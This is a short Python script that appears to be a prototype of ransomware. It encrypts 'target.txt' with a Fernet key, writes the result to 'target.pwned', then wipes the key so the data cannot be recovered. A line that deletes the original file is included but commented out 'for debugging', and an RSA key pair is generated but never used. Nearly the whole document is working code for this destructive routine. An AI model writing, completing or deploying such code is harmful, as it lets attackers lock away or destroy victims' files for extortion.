#Import for symmetric encryption
from cryptography.fernet import Fernet

#Import for asymmetric encryption
import rsa

#Imports for file deletion
import os

# Generates encryption keys
def keys():
    symKey = Fernet.generate_key()
    asymPubKey, asymPrivKey = rsa.newkeys(512)

    #Prints keys for debugging purposes
    print("symKey:",symKey,"\nasymPubKey:",asymPubKey,"\nasymPrivKey:",asymPrivKey)

    print("Keys generated")
    return symKey

# Loads files to be encrypted
def targets():

    #Opens target file for encryption
    uf = open("target.txt", "r")
    unencryptedFile = uf.read()
    uf.close()

    print("Files loaded")
    return unencryptedFile

# Encrypts loaded files
def encrypt(symKey, unencryptedFile):

    #Assign symKey to fernet
    fernet = Fernet(symKey)

    #Encrypt and save the loaded file
    encryptedFile = fernet.encrypt(unencryptedFile.encode())
    ef = open("target.pwned", "x")
    ef.write(str(encryptedFile))
    ef.close()

    #Prints the unencryped and encrypted files for debugging purposes
    print("Printing unencrypted and encrypted file\n\n",unencryptedFile,encryptedFile,"\n")

    print("Files encrypted")
    return

# Deletes old files and clears encryption key from memory
def nuke(symKey):
    
    #file deletion, commented for debugging purposes
    #os.remove("target.txt")
    print("Old files deleted")

    symKey = ""
    print("Key wiped")
    return symKey
    

# Main
print("Program start")
symKey = keys()
unencryptedFile = targets()
encrypt(symKey, unencryptedFile)
symKey = nuke(symKey)
print("Program done")
